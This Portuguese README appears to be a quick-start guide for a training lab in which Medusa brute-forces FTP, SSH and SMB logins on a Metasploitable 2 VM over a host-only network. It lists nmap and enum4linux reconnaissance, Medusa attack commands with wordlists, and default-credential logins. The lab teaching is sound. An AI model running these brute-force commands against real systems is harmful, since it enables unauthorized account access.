# 🚀 Guia de Início Rápido

Este guia fornece instruções resumidas para começar rapidamente com o projeto.

---

## ⚡ Início Rápido (5 minutos)

### 1. Clonar o Repositório

```bash
git clone https://github.com/SEU-USUARIO/desafio-seguranca-medusa.git
cd desafio-seguranca-medusa
```

### 2. Verificar Estrutura

```bash
ls -la
tree  # ou
dir /s  # no Windows
```

### 3. Configurar Ambiente

**No Kali Linux**:

```bash
# Atualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar ferramentas
sudo apt install medusa nmap enum4linux -y

# Verificar instalação
medusa -d
nmap --version
```

### 4. Executar Primeiro Teste

```bash
# 1. Verificar conectividade com alvo
ping 192.168.56.20

# 2. Escanear serviços
cd scripts
chmod +x verificar_servicos.sh
./verificar_servicos.sh 192.168.56.20

# 3. Executar ataque FTP
chmod +x ataque_ftp.sh
./ataque_ftp.sh 192.168.56.20
```

---

## 📋 Comandos Essenciais

### Reconhecimento

```bash
# Descobrir hosts na rede
sudo netdiscover -r 192.168.56.0/24

# Scan completo
nmap -sV -sC -p- -oN scan_completo.txt 192.168.56.20

# Enumerar SMB
enum4linux -a 192.168.56.20
```

### Ataques com Medusa

```bash
# FTP
medusa -h 192.168.56.20 -u msfadmin -P wordlists/senhas_ftp.txt -M ftp

# SSH
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -P wordlists/senhas_comuns.txt -M ssh -t 4

# SMB
medusa -h 192.168.56.20 -U wordlists/usuarios.txt -p Password123 -M smbnt -t 1
```

### Validação

```bash
# Testar FTP
ftp 192.168.56.20
# Login: msfadmin / Senha: msfadmin

# Testar SSH
ssh msfadmin@192.168.56.20

# Testar SMB
smbclient //192.168.56.20/tmp -U service%service
```

---

## 🎯 Checklist de Teste

- [ ] Configurar VMs (Kali + Metasploitable)
- [ ] Configurar rede Host-Only (192.168.56.0/24)
- [ ] Testar conectividade (ping)
- [ ] Executar script de verificação
- [ ] Testar ataque FTP
- [ ] Testar ataque SSH
- [ ] Testar ataque SMB
- [ ] Validar credenciais encontradas
- [ ] Documentar resultados
- [ ] Implementar mitigações (opcional)

---

## 📊 Estrutura de Teste

```
1. Planejamento
   └── Definir escopo e objetivos

2. Reconhecimento
   ├── Descoberta de hosts
   ├── Scan de portas
   └── Enumeração de serviços

3. Análise de Vulnerabilidades
   ├── Identificar serviços vulneráveis
   └── Verificar credenciais padrão

4. Exploração
   ├── Executar ataques de força bruta
   └── Validar acesso

5. Documentação
   ├── Registrar comandos
   ├── Capturar evidências
   └── Escrever relatório

6. Mitigação
   └── Propor e implementar correções
```

---

## 🆘 Solução de Problemas Rápida

### Problema: "medusa: command not found"

```bash
sudo apt update
sudo apt install medusa -y
```

### Problema: "Network unreachable"

```bash
# Verificar IP do Kali
ip addr show

# Verificar configuração de rede das VMs no VirtualBox
# Ambas devem estar em "Host-Only Adapter" (vboxnet0)
```

### Problema: "Connection refused"

```bash
# Verificar se o serviço está rodando no alvo
nmap -p 21,22,139,445 192.168.56.20

# No Metasploitable, verificar serviços
sudo netstat -tulpn
```

### Problema: Scripts não executam

```bash
# Dar permissão de execução
chmod +x scripts/*.sh

# Verificar se está usando bash
bash scripts/ataque_ftp.sh 192.168.56.20
```

---

## 📚 Próximos Passos

Após completar o início rápido:

1. **Aprofundar**: Leia a [documentação completa](docs/)
2. **Experimentar**: Modifique wordlists e parâmetros
3. **Expandir**: Teste outros serviços (MySQL, Telnet, VNC)
4. **Proteger**: Implemente [medidas de mitigação](docs/mitigacao.md)
5. **Compartilhar**: Documente sua experiência no GitHub

---

## 🔗 Links Úteis

- [Configuração Detalhada](docs/configuracao_ambiente.md)
- [Cenários de Ataque](docs/cenarios_ataque.md)
- [Guia de Mitigação](docs/mitigacao.md)
- [Medusa Documentation](http://www.foofus.net/goons/jmk/medusa/medusa.html)
- [Metasploitable 2 Guide](https://docs.rapid7.com/metasploit/metasploitable-2/)

---

**⚠️ Lembrete**: Sempre execute testes apenas em ambientes autorizados!
